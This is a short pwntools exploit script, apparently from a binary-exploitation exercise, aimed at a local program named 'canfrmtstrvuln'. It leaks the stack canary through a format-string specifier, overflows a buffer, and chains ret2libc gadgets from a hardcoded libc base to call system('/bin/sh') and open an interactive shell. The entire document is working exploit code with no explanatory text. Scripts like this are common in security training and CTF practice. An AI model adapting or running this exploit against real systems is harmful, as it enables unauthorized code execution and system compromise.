from pwn import *
from struct import pack

exe = context.binary = ELF('./canfrmtstrvuln')

libc_base_address = 0x7ffff7dcd000
ret = libc_base_address + 0xbeeb1
pop_rdi = libc_base_address + 0x23b72
bin_sh = libc_base_address + 0x1b45bd
_system = libc_base_address + 0x522c0
_exit = libc_base_address + 0x46a70

print("[+] Spawning process...")

io = process([exe.path, "%33$llx"])
canary = int(io.recvline().strip(),16)
print("[+] Canary leaked:{}".format(hex(canary)))

buf = b'A' * 200

buf += p64(canary)
buf += b'\x42' * 8
buf += p64(ret)
buf += p64(pop_rdi)
buf += p64(bin_sh)
buf += p64(_system)
buf += p64(_exit)

with open('payload','wb') as payload:
    payload.write(buf)

io.sendline(buf)
io.interactive()